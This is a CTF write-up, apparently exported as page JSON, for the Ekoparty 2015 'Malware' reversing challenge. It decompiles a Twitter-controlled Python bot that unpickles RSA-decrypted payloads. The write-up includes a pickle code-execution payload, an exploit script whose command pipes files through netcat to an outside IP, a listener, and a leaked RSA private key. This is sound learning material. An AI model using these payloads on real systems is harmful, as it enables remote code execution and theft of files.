{"componentChunkName":"component---src-templates-writeup-js","path":"/writeups/ekoparty-ctf-2015/reversing/Malware/sudhackar","result":{"pageContext":{"html":"<p><a href=\"ctf=ekoparty-ctf-2015\"></a>\n<a href=\"type=reversing\"></a>\n<a href=\"tags=malware,control,pickle,RSA\"></a>\n<a href=\"tools=Twitter,easy-python-decompiler\"></a>\n<a href=\"techniques=Decompiling\"></a></p>\n<h1>Malware (rev-200)</h1>\n<p>We have a <a href=\"/5d0cf6207fa5d23f2e8ab7215ea634d1/rev200.zip\">zip</a>.\nExtract and we get</p>\n<pre><code class=\"language-bash\">$ file ekobot_final.pyc \nekobot_final.pyc: python 2.7 byte-compiled\n</code></pre>\n<p>Byte-compiled python can be very easily decompiled. So here I use <a href=\"http://sourceforge.net/projects/easypythondecompiler/\">Easy Python Decompiler</a>. We get an <a href=\"/b793de9c6a68dc9e788023f39fd77f1d/ekobot_final.py\">output</a> which is scary!</p>\n<pre><code class=\"language-python\"># Embedded file name: ekobot_final.py\nimport os\nimport sys\nimport httplib2\nimport cPickle\nfrom Crypto.PublicKey import RSA\nfrom base64 import b64decode\nfrom twython import Twython\nif 0:\n    i11iIiiIii\nOO0o = 'ekoctf'\nif 0:\n    Iii1I1 + OO0O0O % iiiii % ii1I - ooO0OO000o\nif len(sys.argv) != 2:\n    os._exit(0)\n    if 0:\n        IiII1IiiIiI1 / iIiiiI1IiI1I1\no0OoOoOO00 = sys.argv[1]\nif 0:\n    OOOo0 / Oo - Ooo00oOo00o.I1IiI\no0OOO = 'ienmDwTNHZVR9si4SzeCg1glB'\niIiiiI = 'TTlOJrwq5o9obnRyQXRyaOkRoYUBTrCzN9j9IHX0Bc4dS2xBHN'\nif 0:\n    iii1II11ii * i11iII1iiI + iI1Ii11111iIi + ii1II11I1ii1I + oO0o0ooO0 - iiIIIII1i1iI\n\ndef o0oO0():\n    oo00 = 0\n    if os.path.isfile(o0OoOoOO00):\n        try:\n            o00 = open(o0OoOoOO00, 'r')\n            oo00 = int(o00.readline(), 10)\n        except:\n            oo00 = 0\n\n    return oo00\n    if 0:\n        II1ii - o0oOoO00o.ooO0OO000o + ii1II11I1ii1I.ooO0OO000o - iI1Ii11111iIi\n\n\ndef oo(twid):\n    try:\n        o00 = open(o0OoOoOO00, 'w')\n        o00.write(str(twid))\n    except:\n        if 0:\n            oO0o0ooO0 - OO0O0O - IiII1IiiIiI1.ii1II11I1ii1I * iiIIIII1i1iI * ii1I\n        if 0:\n            ii1II11I1ii1I\n\n\ndef oo00000o0(url):\n    I11i1i11i1I = httplib2.Http('')\n    Iiii, OOO0O = I11i1i11i1I.request(url, 'GET')\n    if Iiii.status == 200:\n        try:\n            if Iiii['content-type'][0:10] == 'text/plain':\n                return OOO0O\n            return 'Err'\n        except:\n            return 'Err'\n\n    else:\n        return url\n        if 0:\n            o0oOoO00o\n\n\ndef IiI1i(cipher_text):\n    try:\n        OOo0o0 = RSA.importKey(open('ekobot.pem').read())\n        O0OoOoo00o = b64decode(cipher_text)\n        iiiI11 = OOo0o0.decrypt(O0OoOoo00o)\n        return iiiI11\n    except Exception as OOooO:\n        print str(OOooO)\n        return 'Err'\n        if 0:\n            OOOo0 + Oo / ii1II11I1ii1I * iiiii\n\n\nII111iiii = Twython(o0OOO, iIiiiI, oauth_version=2)\nII = II111iiii.obtain_access_token()\nII111iiii = Twython(o0OOO, access_token=II)\nif 0:\n    Oo % ii1I\noo00 = o0oO0()\no0oOo0Ooo0O = II111iiii.search(q='#' + OO0o, rpp='250', result_type='mixed', since_id=oo00)\nif 0:\n    I1IiI * iiIIIII1i1iI * iI1Ii11111iIi - oO0o0ooO0 - Ooo00oOo00o\nfor OooO0OO in o0oOo0Ooo0O['statuses']:\n    if OooO0OO['id'] > oo00:\n        oo00 = OooO0OO['id']\n        if 0:\n            ooO0OO000o\n    iii11iII = 0\n    try:\n        for i1I111I in OooO0OO['entities']['hashtags']:\n            if i1I111I['text'] == OO0o:\n                iii11iII = 1\n\n        if iii11iII == 1:\n            for i11I1IIiiIi in OooO0OO['entities']['urls']:\n                if os.fork() == 0:\n                    IiIiIi = IiI1i(oo00000o0(i11I1IIiiIi['url']))\n                    if IiIiIi[0:5] == 'eko11':\n                        cPickle.loads(IiIiIi[5:])\n                    os._exit(0)\n                    if 0:\n                        iii1II11ii.Oo.iIiiiI1IiI1I1.ii1I\n\n    except Exception as OOooO:\n        print str(OOooO)\n        if 0:\n            ii1II11I1ii1I + ooO0OO000o % i11iIiiIii.o0oOoO00o - IiII1IiiIiI1\n\noo(oo00)\n</code></pre>\n<p>I scroll though the code and rename variables to make it more readable and easy to debug. <a href=\"/36cb44c57283c59fd6eed35be3ecf000/ekobot-chall.py\">Final</a></p>\n<pre><code class=\"language-python\">import os\nimport sys\nimport httplib2\nimport cPickle\nfrom Crypto.PublicKey import RSA\nfrom base64 import b64decode\nfrom twython import Twython\nname = 'ekoctf'\n\nif len(sys.argv) != 2:\n    os._exit(0)\n    if 0:\n        IiII1IiiIiI1 / iIiiiI1IiI1I1\nargv_1 = sys.argv[1]\nSecret = 'ienmDwTNHZVR9si4SzeCg1glB'\nkey = 'TTlOJrwq5o9obnRyQXRyaOkRoYUBTrCzN9j9IHX0Bc4dS2xBHN'\nprint \"Here!\"\ndef o0oO0():\n    max_id = 0\n    if os.path.isfile(argv_1):\n        try:\n            o00 = open(argv_1, 'r')\n            max_id = int(o00.readline(), 10)\n        except:\n            max_id = 0\n\n    return max_id\n\ndef save_new_max(twid):\n    try:\n        o00 = open(argv_1, 'w')\n        o00.write(str(twid))\n    except:\n        print error\n\n\ndef get_content(url):\n    print url\n    I11i1i11i1I = httplib2.Http('')\n    Iiii, OOO0O = I11i1i11i1I.request(url, 'GET')\n    if Iiii.status == 200:\n        try:\n            if Iiii['content-type'][0:10] == 'text/plain':\n                return OOO0O\n            return 'Err'\n        except:\n            return 'Err'\n\n    else:\n        return url\n\ndef decrypt(cipher_text):\n    print cipher_text\n    return 'err'\n    try:\n        OOo0o0 = RSA.importKey(open('ekobot.pem').read())\n        O0OoOoo00o = b64decode(cipher_text)\n        iiiI11 = OOo0o0.decrypt(O0OoOoo00o)\n        return iiiI11\n    except Exception as OOooO:\n        print str(OOooO)\n        return 'Err'\ntwython_object = Twython(Secret, key, oauth_version=2)\naccess_token = twython_object.obtain_access_token()\ntwython_object = Twython(Secret, access_token=access_token)\nmax_id = o0oO0()\nsearch_result = twython_object.search(q='#' + name, rpp='250', result_type='mixed', since_id=max_id)\n\nfor i in search_result['statuses']:\n    print i['id']\n    if i['id'] > max_id:\n        max_id = i['id']\n    iii11iII = 0\n    try:\n        for i1I111I in i['entities']['hashtags']:\n            if i1I111I['text'] == name:\n                iii11iII = 1\n\n        if iii11iII == 1:\n            for j in i['entities']['urls']:\n                if True:\n                    IiIiIi = decrypt(get_content(j['url']))\n                    print IiIiIi\n                    if IiIiIi[0:5] == 'eko11':\n                        cPickle.loads(IiIiIi[5:])\n                    #os._exit(0)\n\n    except Exception as OOooO:\n        print str(OOooO)\n\nprint max_id\n</code></pre>\n<p>Now twython is Python wrapper for the Twitter API. Here first the program is registering itself and then searching for tweets with 'ekoctf' tag. For every tweet it will try to extract a url from it, then visit the url and dowload the content if its 'text\\plain' Content-type. Next this content is decrypted by some private key locally stored. The decrypted plaintext is verified for starting with 'eko11' and the rest is loaded os cPickle.</p>\n<p>cPickle is used to serialize python objects and suffers from code execution on loads().</p>\n<pre><code class=\"language-python\">cPickle.loads('cos\\nsystem\\n(S'cat /etc/passwd'\\ntR.'\\ntR.')\n</code></pre>\n<p>If this service is being run somewhere then we can have code execution on that machine just by Tweeting our commands.\nA nice example of C&#x26;C( command and control ).</p>\n<p>However we would need a public key for encrypting the data. Looking around on twitter we find the <a href=\"/4d09c7c3dfa9d92f853e91510a7ce81a/pub.pem\">key</a> with same hashtag.\nNow we can get the flag by various methods on the machine. We can make a request to a controlled domain with contents of the flag.</p>\n<p>What I did was \"cat * | nc my-machine port\". It will dump the contents of every file to the port which I was listening on my machine.\nA quick RSA encryption</p>\n<pre><code class=\"language-python\">from Crypto.PublicKey import RSA\nfrom base64 import b64decode,b64encode\n\nkey=RSA.importKey(open('pub.pem').read())\nexploit=\"eko11\"+\"cos\\nsystem\\n(S'cat * | nc 182.70.222.238 8000'\\ntR.'\\ntR.\"\ntxt=key.encrypt(exploit,32)[0]\nfinal=b64encode(txt)\nprint final\n</code></pre>\n<p>We can use pastebin's view-raw url as a link in the tweet and </p>\n<pre><code class=\"language-bash\">while true ; do nc -l -n -v  -p 8000 ; done\n</code></pre>\n<p>on my machine. After some 30-40 seconds</p>\n<pre><code>-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAmWw84H8BSPG1Ispn1hBPWZ4ORxniLhOl76aOAsGsqdRZJyL+\nPFLWedGUx0ELwzf3vWQ2wMDwN37MZYWdS4z8WT6P4FRtK09UtDgqNUQdx49WBqDf\n2GmIT+uBwMQBUCe3x+RTVcwDzA1I0mPtJj3K6bGdmSSBZjgc6MA4rJil7xdSVP5P\nedb8MZMKk/5tXmFl3gFjykkUfG+DbmsxulZ48D+IoIU6bVWAkael+ftZtDWY43Xk\nezD2swV01Eaw4J7MzBakPDA6KipxNhKQZ2xoeEsP2p8L67qF48eUbxI1ukcrqdy0\nc92rSihmChGBmHQ2AREshtTTLpM24/Nrirje/QIDAQABAoIBAEF/xyGktxy4LDe1\nJ81o2yeMZdYPA9PeCYqdlaUxoBBFGuatdtK0HuKVCipi562pWDff78ws0qEunf59\no6CciSNkpTIFeTHzRVtHWyWwdfI7jGN6DPasX0iXZ6avR0w8GKbbIITRe5GC3mML\nzDP2T4mjjX/S6PeF3zmyzr9I0BaZOgTdUumuYCzDfA9+MgRxIUi9i+7rrOMTiGdo\nWGJVGC+j8vQiyf5eOGtlQxYLwm2pWas3EYrvk6jiesNhdDvr87X7YW8uABwUlLr5\n5m/vocLCJLpo+QjFdyo6bNd/wEfQs1pG9C0UPIe46YIEeAkY08q2a5xzikfx/CGL\nnsgc/dUCgYEAyynNy9qbUEbgJr6dfksTs2nBu89yG/vy3eoNoUbStr0LCAIYl8kn\nXnwliCuli/5Zssb6/uBqX7fUuD3ztgCmo8KoNjJ/VHh9n701Uwl5FghqeoILnQHI\nCFbN1Ub18VoOLt2SjgKN+7sqqrEiCqyyFxyoCDyBkBOqS7gr0V+/wMMCgYEAwVLQ\nVZb335ovMx20cE8yO200dbwFdlJsYhM0PKSLLJ0aSsymrhFhUZC/rjQ8rJD1zs+W\nlg6QeQ6yQRE4n4egi8NOnMms83kIMGeOa5VvCcQxXJ8v4Vez432SOeRHMxiUmiME\nXHGnulsI9NhKYoMKfvfvLEwptzhCfAr2QO7e5T8CgYEAuFcZFVQowuFcd6tTagmj\nOZLHJ6tl5YBpcPPzJBgID6lePgjw2aC6aSAKShEYZ/sE1pN3oRZtTqaVjAsifE0A\n5uw0BuEw6ateiTd8D/kzdktymfAvq2m3X+GraE630COfZOTFGre0rum4ICMTOU5T\nVWc6DCcihGFjjsrwb00Kx1MCgYAB9KuE4iUZzv6BPuCvbi2s6jroogFQJB9Skq0p\nm+SIjAJTFWTuR+C7KYK26XJfsIu8Dt+QHw+ZGev1uo3fF0kpgM1Pyr6ELApIKxQG\nxJk9+Q0iyb17Qx7fw0pyaXvK6Ym/UXFe2gt/WCJsD7AY9QhrJmj2AsM9RkVt6dJ5\n77CzkwKBgQCk8oTtzfyXzUWcqsiekmHmzDAuO+SH/a0/FP2ceTq0I1caS6OAvYlj\nR9aTJk5P02EmnfWCZVpMhzHlL4zO1x+2PiUiAXOthbyufWt5qyigp6jsNouLqFz0\nOksk+bPu1XDVqT2XpoQtFXyFuJZmaFlA3k2Ny7rGe5bJ8XWCX6E+Bg==\n-----END RSA PRIVATE KEY-----\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmWw84H8BSPG1Ispn1hBP\nWZ4ORxniLhOl76aOAsGsqdRZJyL+PFLWedGUx0ELwzf3vWQ2wMDwN37MZYWdS4z8\nWT6P4FRtK09UtDgqNUQdx49WBqDf2GmIT+uBwMQBUCe3x+RTVcwDzA1I0mPtJj3K\n6bGdmSSBZjgc6MA4rJil7xdSVP5Pedb8MZMKk/5tXmFl3gFjykkUfG+DbmsxulZ4\n8D+IoIU6bVWAkael+ftZtDWY43XkezD2swV01Eaw4J7MzBakPDA6KipxNhKQZ2xo\neEsP2p8L67qF48eUbxI1ukcrqdy0c92rSihmChGBmHQ2AREshtTTLpM24/Nrirje\n/QIDAQAB\n-----END PUBLIC KEY-----\n#/usr/bin/python\nimport os\nimport sys\nimport httplib2\nimport cPickle\nfrom Crypto . PublicKey import RSA\nfrom base64 import b64decode\nfrom twython import Twython\nif 64 - 64: i11iIiiIii\nOO0o = 'ekoctf'\nif 81 - 81: Iii1I1 + OO0O0O % iiiii % ii1I - ooO0OO000o\nif ( len ( sys . argv ) &#x3C;> 2 ) :\n os . _exit ( 0 )\n if 4 - 4: IiII1IiiIiI1 / iIiiiI1IiI1I1\no0OoOoOO00 = sys . argv [ 1 ]\nif 27 - 27: OOOo0 / Oo - Ooo00oOo00o . I1IiI\no0OOO = 'ienmDwTNHZVR9si4SzeCg1glB'\niIiiiI = 'TTlOJrwq5o9obnRyQXRyaOkRoYUBTrCzN9j9IHX0Bc4dS2xBHN'\nif 23 - 23: iii1II11ii * i11iII1iiI + iI1Ii11111iIi + ii1II11I1ii1I + oO0o0ooO0 - iiIIIII1i1iI\ndef o0oO0 ( ) :\n oo00 = 0\n if os . path . isfile ( o0OoOoOO00 ) :\n  try :\n   o00 = open ( o0OoOoOO00 , \"r\" )\n   oo00 = int ( o00 . readline ( ) , 10 )\n  except :\n   oo00 = 0\n return oo00\n if 62 - 62: II1ii - o0oOoO00o . ooO0OO000o + ii1II11I1ii1I . ooO0OO000o - iI1Ii11111iIi\ndef oo ( twid ) :\n try :\n  o00 = open ( o0OoOoOO00 , \"w\" )\n  o00 . write ( str ( twid ) )\n except :\n  pass\n  if 89 - 89: oO0o0ooO0 - OO0O0O - IiII1IiiIiI1 . ii1II11I1ii1I * iiIIIII1i1iI * ii1I\n  if 25 - 25: ii1II11I1ii1I\ndef oo00000o0 ( url ) :\n I11i1i11i1I = httplib2 . Http ( \"\" )\n Iiii , OOO0O = I11i1i11i1I . request ( url , 'GET' )\n if Iiii . status == 200 :\n  try :\n   if Iiii [ \"content-type\" ] [ 0 : 10 ] == 'text/plain' :\n    return OOO0O\n   else :\n    return 'Err'\n  except :\n   return 'Err'\n else :\n  return url\n  if 94 - 94: o0oOoO00o\ndef IiI1i ( cipher_text ) :\n try :\n  OOo0o0 = RSA . importKey ( open ( 'ekobot.pem' ) . read ( ) )\n  O0OoOoo00o = b64decode ( cipher_text )\n  iiiI11 = OOo0o0 . decrypt ( O0OoOoo00o )\n  return iiiI11\n except Exception , OOooO :\n  print str ( OOooO )\n  return 'Err'\n  if 58 - 58: OOOo0 + Oo / ii1II11I1ii1I * iiiii\nII111iiii = Twython ( o0OOO , iIiiiI , oauth_version = 2 )\nII = II111iiii . obtain_access_token ( )\nII111iiii = Twython ( o0OOO , access_token = II )\nif 63 - 63: Oo % ii1I\noo00 = o0oO0 ( )\no0oOo0Ooo0O = II111iiii . search ( q = '#' + OO0o , rpp = \"250\" , result_type = \"mixed\" , since_id = oo00 )\nif 81 - 81: I1IiI * iiIIIII1i1iI * iI1Ii11111iIi - oO0o0ooO0 - Ooo00oOo00o\nfor OooO0OO in o0oOo0Ooo0O [ 'statuses' ] :\n if OooO0OO [ 'id' ] > oo00 :\n  oo00 = OooO0OO [ 'id' ]\n  if 28 - 28: ooO0OO000o\n iii11iII = 0\n try :\n  for i1I111I in OooO0OO [ 'entities' ] [ 'hashtags' ] :\n   if i1I111I [ 'text' ] == OO0o :\n    iii11iII = 1\n  if iii11iII == 1 :\n   for i11I1IIiiIi in OooO0OO [ 'entities' ] [ 'urls' ] :\n    if os . fork ( ) == 0 :\n     IiIiIi = IiI1i ( oo00000o0 ( i11I1IIiiIi [ 'url' ] ) )\n     if IiIiIi [ 0 : 5 ] == 'eko11' :\n      cPickle . loads ( IiIiIi [ 5 : ] )\n     os . _exit ( 0 )\n     if 40 - 40: iii1II11ii . Oo . iIiiiI1IiI1I1 . ii1I\n except Exception , OOooO :\n  print str ( OOooO )\n  if 33 - 33: ii1II11I1ii1I + ooO0OO000o % i11iIiiIii . o0oOoO00o - IiII1IiiIiI1\noo ( oo00 )\n# dd678faae9ac167bc83abf78e5cb2f3f0688d3a3\nEKO{simple_C&#x26;C_RSAtu1ts}\n</code></pre>\n<p>Flag:</p>\n<blockquote>\n<p>EKO{simple_C&#x26;C_RSAtu1ts}</p>\n</blockquote>\n<p>PS: I spent about 10 hours on this chall only because of the API. It never read my tweets. The admin fmunozs was cool and helpful and even used his account to tweet. Cheers man!</p>","relativePath":"writeups/ekoparty-ctf-2015/reversing/Malware/sudhackar"}}}